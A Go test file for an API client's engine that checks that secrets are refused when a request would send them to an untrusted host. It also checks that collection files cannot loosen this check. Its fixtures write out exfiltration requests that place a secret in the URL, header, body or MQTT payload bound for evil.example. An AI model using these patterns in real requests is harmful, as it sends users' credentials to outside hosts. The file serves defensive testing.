// SPDX-License-Identifier: Apache-2.0

package engine

import (
	"slices"
	"strings"
	"testing"

	"github.com/githugt/flowi/lib/diag"
	"github.com/githugt/flowi/lib/model"
	"github.com/githugt/flowi/lib/vault"
)

// Before: a cloned collection with https://evil.example/?k={{secret.x}} sent the real secret there.
func TestSend_Given_a_secret_would_go_to_a_host_nobody_trusted_Then_it_is_refused_before_anything_is_sent(t *testing.T) {
	f := newFixture(t)
	r := f.addRequest("steal", model.RequestVersion{Method: "GET", URL: "https://evil.example/?k={{secret.password}}"})
	hdr := f.addRequest("steal-header", model.RequestVersion{Method: "GET", URL: "https://evil.example/", Headers: []model.KeyValue{{Key: "Authorization", Value: "Bearer {{secret.password}}"}}})
	body := f.addRequest("steal-body", model.RequestVersion{Method: "POST", URL: "https://evil.example/", Body: model.Body{Text: "pw={{secret.password}}"}})

	for _, req := range []model.Request{r, hdr, body} {
		res, _ := f.send(f.input(req))

		if res.Status != StatusError || !hasCode(res.Diags, diag.CodeSecretHost) {
			t.Fatalf("%s: status %s diags %v", req.Path, res.Status, res.Diags)
		}
		if got := res.Diags[0].Args["host"]; got != "evil.example" {
			t.Errorf("%s: host %q", req.Path, got)
		}
		if res.Record != nil {
			t.Errorf("%s: a record exists, so something was sent: %+v", req.Path, res.Record)
		}
	}
	if f.hits.Load() != 0 {
		t.Errorf("the test API was called %d times", f.hits.Load())
	}
}

func TestSend_Given_the_secret_goes_to_the_environments_own_host_Then_it_is_sent(t *testing.T) {
	f := newFixture(t)
	r := f.addRequest("login", model.RequestVersion{Method: "POST", URL: "{{env.base_url}}/login", Body: model.Body{JSON: `{"password":"{{secret.password}}"}`}})

	res, _ := f.send(f.input(r))

	if hasCode(res.Diags, diag.CodeSecretHost) || res.Record == nil {
		t.Fatalf("status %s diags %v", res.Status, res.Diags)
	}
}

func TestSend_Given_a_collection_file_allows_the_host_Then_the_secret_is_still_refused(t *testing.T) {
	// A collection cannot set secrets.allowed_hosts or turn the check off: only the person's own settings can.
	f := newFixture(t)
	f.update(func(c *model.Collection) {
		c.Manifest.Settings = model.Settings{"secrets.allowed_hosts": []any{"evil.example"}, "secrets.host_check": "off"}
	})
	r := f.addRequest("steal", model.RequestVersion{Method: "GET", URL: "https://evil.example/?k={{secret.password}}"})

	res, _ := f.send(f.input(r))

	if !hasCode(res.Diags, diag.CodeSecretHost) {
		t.Fatalf("status %s diags %v", res.Status, res.Diags)
	}
}

func TestSend_Given_no_secret_is_in_the_request_Then_the_host_is_not_checked(t *testing.T) {
	f := newFixture(t)
	r := f.addRequest("plain", model.RequestVersion{Method: "GET", URL: "{{env.base_url}}/ping?x=1"})

	res, _ := f.send(f.input(r))

	if hasCode(res.Diags, diag.CodeSecretHost) {
		t.Fatalf("diags %v", res.Diags)
	}
}

func TestSend_Async_Given_a_secret_would_go_to_an_untrusted_broker_Then_it_is_refused(t *testing.T) {
	tr := &scripted{}
	v := asyncVersion(model.Async{Server: "mqtt://broker.evil.example:1883", Send: &model.AsyncSend{Body: model.Body{JSON: `{"pw":"{{secret.password}}"}`}}, Receive: &model.AsyncReceive{}})

	res, _ := sendAsync(t, tr, v, nil)

	if res.Status != StatusError || !hasCode(res.Diags, diag.CodeSecretHost) || tr.got.Server != "" {
		t.Fatalf("status %s diags %v got %+v", res.Status, res.Diags, tr.got)
	}
}

// executionWith is an execution that carries the secret hunter2 in the run, in the given mode.
func executionWith(mode string, allowed []string, env map[string]any) *execution {
	return &execution{
		cfg: config{secretHosts: mode, secretAllowed: allowed},
		env: environment{name: "staging", values: env},
		r:   &runner{secrets: &secretTracker{masker: vault.NewMasker("hunter2")}},
		c:   call{request: model.Request{Path: "orders/place"}},
	}
}

func TestCheckSecretDestination_Given_warn_Then_it_goes_with_a_warning_and_off_Then_without(t *testing.T) {
	warn := executionWith(hostCheckWarn, nil, nil)
	off := executionWith(hostCheckOff, nil, nil)

	okWarn := warn.checkSecretDestination("https://evil.example/?k=hunter2")
	okOff := off.checkSecretDestination("https://evil.example/?k=hunter2")

	if !okWarn || !okOff {
		t.Fatalf("warn %v off %v", okWarn, okOff)
	}
	if len(warn.diags) != 1 || warn.diags[0].Severity != diag.SeverityWarning || warn.diags[0].Code != diag.CodeSecretHost {
		t.Errorf("warn diags %v", warn.diags)
	}
	if len(off.diags) != 0 {
		t.Errorf("off diags %v", off.diags)
	}
}

func TestCheckSecretDestination_should_find_a_secret_in_any_part_that_goes_out(t *testing.T) {
	cases := map[string][]string{
		"url":     {"https://evil.example/?k=hunter2"},
		"header":  {"https://evil.example/", "Bearer hunter2"},
		"body":    {"https://evil.example/", "", "pw=hunter2"},
		"encoded": {"https://evil.example/?k=hunter2"},
	}
	for name, parts := range cases {
		x := executionWith(hostCheckWarn, nil, nil)

		x.checkSecretDestination(parts[0], parts[1:]...)

		if len(x.diags) != 1 {
			t.Errorf("%s: diags %v", name, x.diags)
		}
	}
	x := executionWith(hostCheckWarn, nil, nil)
	x.checkSecretDestination("https://evil.example/", "nothing secret here")
	if len(x.diags) != 0 {
		t.Errorf("no secret: diags %v", x.diags)
	}
}

func TestTrustedHost_should_trust_loopback_the_environments_hosts_and_the_allowed_list_only(t *testing.T) {
	env := []string{"api.example.com"}
	allowed := []string{"Tools.Example.org", "svc.example.net:8443", "*.corp.example"}
	cases := []struct {
		host string
		want bool
	}{
		{"localhost:8080", true}, {"app.localhost", true}, {"127.0.0.1:9000", true}, {"[::1]:80", true}, {"127.9.9.9", true},
		{"api.example.com", true}, {"api.example.com:8443", true},
		{"tools.example.org:1", true},
		{"svc.example.net:8443", true}, {"svc.example.net:9", false}, {"svc.example.net", false},
		{"a.corp.example", true}, {"corp.example", false}, {"evilcorp.example", false},
		{"evil.example", false}, {"api.example.com.evil.example", false}, {"10.0.0.5", false}, {"", false},
	}
	for _, c := range cases {
		if got := trustedHost(c.host, env, allowed); got != c.want {
			t.Errorf("%q: got %v want %v", c.host, got, c.want)
		}
	}
}

func TestHostsOf_should_read_urls_broker_lists_and_credentials(t *testing.T) {
	cases := map[string][]string{
		"https://API.example.com:8443/path?q=1": {"api.example.com:8443"},
		"kafka://a:9092,b:9092":                 {"a:9092", "b:9092"},
		"amqp://user:p@ss@broker:5672/vhost":    {"broker:5672"},
		"broker:1883":                           {"broker:1883"},
		"":                                      nil,
		"   ":                                   nil,
	}
	for in, want := range cases {
		if got := hostsOf(in); !slices.Equal(got, want) {
			t.Errorf("%q: got %v want %v", in, got, want)
		}
	}
}

func TestHostsOfValues_should_collect_addresses_from_nested_values_without_ports(t *testing.T) {
	env := map[string]any{"base_url": "https://api.example.com:8443", "n": 3, "name": "not an address", "svc": map[string]any{"url": "http://inner.example/x"}, "list": []any{"wss://ws.example/"}}

	got := hostsOfValues(env)
	slices.Sort(got)

	if want := []string{"api.example.com", "inner.example", "ws.example"}; !slices.Equal(got, want) {
		t.Fatalf("got %v want %v", got, want)
	}
	if strings.Contains(strings.Join(got, ","), ":") {
		t.Errorf("ports kept: %v", got)
	}
}

func TestNewConfig_should_read_the_host_check_only_from_the_persons_own_settings(t *testing.T) {
	f := newFixture(t)
	f.lookup.user = model.Settings{"secrets.host_check": "warn", "secrets.allowed_hosts": []any{"api.example.com"}}

	own := newConfig(f.lookup.Settings(collID, "", model.Settings{}))
	f.lookup.user = nil
	f.update(func(c *model.Collection) { c.Manifest.Settings = model.Settings{"secrets.host_check": "off"} })
	collection := newConfig(f.lookup.Settings(collID, "", model.Settings{}))

	if own.secretHosts != hostCheckWarn || !slices.Equal(own.secretAllowed, []string{"api.example.com"}) {
		t.Errorf("own %+v", own)
	}
	if collection.secretHosts != hostCheckBlock || len(collection.secretAllowed) != 0 {
		t.Errorf("a collection file changed it: %+v", collection)
	}
}
